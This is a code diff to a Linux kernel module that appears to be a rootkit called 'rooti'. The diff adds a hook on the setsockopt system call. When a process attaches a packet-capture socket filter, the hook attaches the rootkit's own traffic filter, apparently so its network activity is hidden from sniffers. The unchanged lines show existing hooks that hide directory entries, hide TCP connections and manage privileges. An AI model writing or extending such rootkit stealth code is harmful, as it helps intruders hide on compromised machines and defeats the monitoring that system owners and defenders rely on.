@@ -6,6 +6,7 @@
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
 #include <linux/threads.h>
+#include <linux/file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "hooking/utils.h"
@@ -14,6 +15,7 @@
 #include "capabilities/privilege.h"
 #include "capabilities/track.h"
 #include "capabilities/hide.h"
+#include "capabilities/hiding/traffic.h"
 #include "utils.h"
 #include "config.h"
 
@@ -50,6 +52,7 @@ static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
 static asmlinkage long (*orig_dup3)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
+static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);
 
 // References to the original file operations which we are hooking
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
@@ -196,6 +199,28 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
 }
 
+static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
+{
+    int fd = regs->di;
+    int optname = regs->dx;
+    int err = orig_setsockopt(regs);
+
+    // For now we only care about hooking the option to attach a socket filter
+    if (err || (optname != SO_ATTACH_FILTER)) {
+        return err;
+    }
+
+    struct socket *sock = sock_from_file(fget(fd));
+    if (sock == NULL) {
+        ROOTI_DEBUG("failed to convert file struct to sock struct");
+        return 0;
+    }
+
+    rooti_attach_traffic_filter(sock->sk);
+
+    return 0;
+}
+
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
@@ -252,7 +277,8 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup2"), hook_dup2, &orig_dup2),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup3"), hook_dup3, &orig_dup3),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt)
 };
 
 /* LKM initialization */
